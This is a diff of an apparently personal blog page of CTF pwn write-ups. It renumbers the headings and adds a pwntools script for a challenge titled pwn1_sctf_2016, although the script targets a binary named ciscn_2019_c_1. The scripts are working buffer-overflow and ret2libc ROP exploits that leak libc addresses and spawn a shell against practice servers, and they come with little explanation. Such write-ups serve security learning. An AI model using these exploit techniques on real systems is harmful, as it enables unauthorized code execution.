@@ -26,7 +26,7 @@
     
     <div id="post-toc" class="animated hiddenToc hide">
       <span class="title">Toc</span>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#rip"><span class="toc-text">rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup-csaw-2016"><span class="toc-text">warmup_csaw_2016</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-rip"><span class="toc-text">0x01:rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-warmup-csaw-2016"><span class="toc-text">0x02:warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-pwn1-sctf-2016"><span class="toc-text">0x03:pwn1_sctf_2016</span></a></li></ol></li></ol>
     </div>
     
     <div id="fixed-menu-wrap">
@@ -192,7 +192,7 @@
       <div>
       </div>
     </div>
-    <h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="rip">rip<a class="post-anchor" href="#rip"></a></h2><p><a href="http://blog.eonew.cn/archives/958" target="_blank" rel="noopener">在一些64位的glibc的payload调用system函数失败问题</a></p>
+    <h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="0x01-rip">0x01:rip<a class="post-anchor" href="#0x01-rip"></a></h2><p><a href="http://blog.eonew.cn/archives/958" target="_blank" rel="noopener">在一些64位的glibc的payload调用system函数失败问题</a></p>
 <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span>
 <span class="hljs-comment">#encoding:utf-8</span>
 <span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span>
@@ -221,7 +221,7 @@ payload += p64(elf.symbols[<span class="hljs-string">"system"</span>])
 p.sendline(payload)
 p.interactive()</code></pre>
 
-<h2 id="warmup-csaw-2016">warmup_csaw_2016<a class="post-anchor" href="#warmup-csaw-2016"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span>
+<h2 id="0x02-warmup-csaw-2016">0x02:warmup_csaw_2016<a class="post-anchor" href="#0x02-warmup-csaw-2016"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span>
 <span class="hljs-comment">#encoding:utf-8</span>
 <span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span>
 <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
@@ -246,6 +246,49 @@ p.recvuntil(<span class="hljs-string">"&gt;"</span>)
 
 <span class="hljs-comment"># gdb.attach(p)</span>
 p.sendline(<span class="hljs-string">"a"</span>*<span class="hljs-number">0x48</span>+p64(backdoor))
+p.interactive()</code></pre>
+
+<h2 id="0x03-pwn1-sctf-2016">0x03:pwn1_sctf_2016<a class="post-anchor" href="#0x03-pwn1-sctf-2016"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span>
+<span class="hljs-comment">#encoding:utf-8</span>
+<span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-comment"># context.arch = 'amd64'</span>
+context.log_level=<span class="hljs-string">'debug'</span>
+context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]
+file_name = <span class="hljs-string">'./ciscn_2019_c_1'</span>
+libc_name = <span class="hljs-string">'../libc/18-libc64.so'</span>
+ip = <span class="hljs-string">'node3.buuoj.cn'</span>
+port = <span class="hljs-string">'25405'</span>
+debug = <span class="hljs-number">0</span>
+<span class="hljs-keyword">if</span>(debug == <span class="hljs-number">1</span>):
+	p = process(file_name)
+	elf = ELF(file_name)
+	libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)
+<span class="hljs-keyword">else</span>:
+	p = remote(ip,int(port))
+	elf = ELF(file_name)
+	libc = ELF(<span class="hljs-string">"../libc/18-libc64.so"</span>)
+li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)
+ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)
+
+ret = <span class="hljs-number">0x00000000004006b9</span>
+rdi_ret = <span class="hljs-number">0x0000000000400c83</span>
+main = <span class="hljs-number">0x000000000400B28</span>
+p.sendlineafter(<span class="hljs-string">"choice!\n"</span>,<span class="hljs-string">"1"</span>)
+payload = <span class="hljs-string">"a"</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>)
+payload += p64(rdi_ret)+p64(elf.got[<span class="hljs-string">'__libc_start_main'</span>])+p64(elf.plt[<span class="hljs-string">'puts'</span>])+p64(main)
+p.sendlineafter(<span class="hljs-string">"encrypted\n"</span>,(payload))
+p.recvuntil(<span class="hljs-string">"@\n"</span>)
+addr = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))
+ls(<span class="hljs-string">"libc start main"</span>,addr)
+libc.address = addr-libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]
+ls(<span class="hljs-string">"libc addr"</span>,libc.address)
+
+payload = <span class="hljs-string">"a"</span>*<span class="hljs-number">0x58</span>
+payload +=  p64(rdi_ret)+p64(libc.search(<span class="hljs-string">"/bin/sh\x00"</span>).next())+p64(ret)+p64(libc.symbols[<span class="hljs-string">'system'</span>])
+p.sendlineafter(<span class="hljs-string">"choice!\n"</span>,<span class="hljs-string">"1"</span>)
+p.sendlineafter(<span class="hljs-string">"encrypted\n"</span>,(payload))
 p.interactive()</code></pre>
 
 
